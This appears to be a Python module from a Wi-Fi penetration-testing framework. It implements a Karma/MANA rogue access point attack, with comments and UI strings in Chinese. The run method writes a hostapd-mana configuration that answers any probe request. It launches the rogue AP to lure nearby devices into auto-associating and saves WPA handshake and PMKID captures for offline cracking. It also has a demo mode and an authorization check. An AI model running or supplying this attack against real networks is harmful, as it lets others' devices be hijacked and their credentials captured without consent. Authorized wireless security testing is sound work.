"""Karma / MANA：响应任意 Probe Request 的流氓 AP."""

from __future__ import annotations

import asyncio
import time
from pathlib import Path

from .base import AttackContext, AttackModule, AttackResult, Option
from ..core.utils import make_run_dir
from ..models import normalize_mac


class KarmaAttack(AttackModule):
    id = "karma"
    name = "Karma / MANA"
    category = "rogue_ap"
    description = (
        "使用 hostapd-mana 响应客户端发出的任意 Probe Request（不校验 SSID），"
        "诱导设备自动关联，并可导出 WPA 握手/PMKID 供离线分析。"
    )
    requires = ("hostapd-mana",)
    risk = "critical"
    needs_monitor = False
    options = [
        Option("channel", "工作信道", "int", 6, "建议与目标客户端常用信道一致"),
        Option("timeout", "运行时长（秒）", "int", 180, "到期自动关闭"),
        Option("loud", "MANA Loud", "bool", True, "广播更多已知 SSID 以提升命中率"),
        Option("essid", "默认 SSID", "text", "FreeWiFi", "客户端未发 Probe 时的兜底 SSID"),
    ]

    async def run(self, ctx: AttackContext, params: dict) -> AttackResult:
        started = time.time()
        channel = int(params.get("channel") or 6)
        timeout = max(20, int(params.get("timeout") or 180))
        essid = str(params.get("essid") or "FreeWiFi")
        ctx.authorize("karma", "", essid)
        ctx.emit("attack", f"Karma/MANA 启动：ch{channel} · {timeout}s", channel=channel)

        if ctx.demo:
            steps = [
                "进入监听/AP 模式（模拟）",
                "监听 Probe Request，提取 PNL 中的 SSID",
                "对每个探测 SSID 动态响应 Beacon/Probe Response",
                "等待客户端自动关联（模拟）",
            ]
            for step in steps:
                await asyncio.sleep(0.55)
                ctx.emit("info", step)
            from ..recon.demo import DEMO_NETWORKS

            probed = [net.ssid for net in DEMO_NETWORKS if net.ssid][:6]
            ctx.finding(
                "客户端探测请求泄露首选网络列表",
                "medium",
                ssid=essid,
                detail="Karma 可对任意探测 SSID 作出响应，建议关闭设备的自动加入开放网络功能。",
                category="rogue_ap",
            )
            return AttackResult(
                ok=True,
                summary=f"Karma 已响应 {len(probed)} 个探测 SSID（模拟）",
                detail={"demo": True, "answered": probed, "channel": channel},
                duration=time.time() - started,
            )

        iface = await ctx.iface_mgr.resolve(ctx.config.iface)
        if not iface:
            raise RuntimeError("未找到可用无线网卡")
        run_dir = make_run_dir(ctx.config.run_path, "karma")
        conf_path = run_dir / "hostapd-mana.conf"
        capture_path = run_dir / "mana.pcapng"
        conf_path.write_text(
            f"""interface={iface.name}
driver=nl80211
ssid={essid}
hw_mode={'g' if channel <= 13 else 'a'}
channel={channel}
auth_algs=1
wmm_enabled=1
enable_mana=1
mana_loud={1 if params.get('loud', True) else 0}
enable_karma=1
karma_loud={1 if params.get('loud', True) else 0}
mana_wpaout={capture_path}
""",
            encoding="utf-8",
        )
        await ctx.runner.run(["ip", "link", "set", iface.name, "up"], timeout=8)
        proc = await ctx.runner.background(
            ["hostapd-mana", str(conf_path)], delay=2.0,
            on_line=lambda line: ctx.log(f"[mana] {line}"),
        )
        try:
            waited = 0
            while waited < timeout:
                await asyncio.sleep(2)
                waited += 2
                if waited % 20 == 0:
                    ctx.emit("debug", f"Karma 运行中… {waited}/{timeout}s")
        finally:
            await ctx.runner.terminate(proc)

        capture_id = None
        if capture_path.exists() and capture_path.stat().st_size > 0:
            capture_id = ctx.register_capture(
                "handshake", capture_path, ssid=essid, meta={"karma": True}
            )
        ctx.finding(
            "Karma/MANA 攻击面存在",
            "high",
            ssid=essid,
            detail="客户端会向任意同名/探测过的 SSID 发起关联，攻击者可自动响应并捕获认证流量。",
            category="rogue_ap",
        )
        return AttackResult(
            ok=True,
            summary=f"Karma 运行 {int(time.time() - started)}s"
            + ("，已导出认证流量" if capture_id else "，未捕获认证流量"),
            detail={"config": str(conf_path), "iface": iface.name, "capture": str(capture_path)},
            capture_id=capture_id,
            duration=time.time() - started,
        )
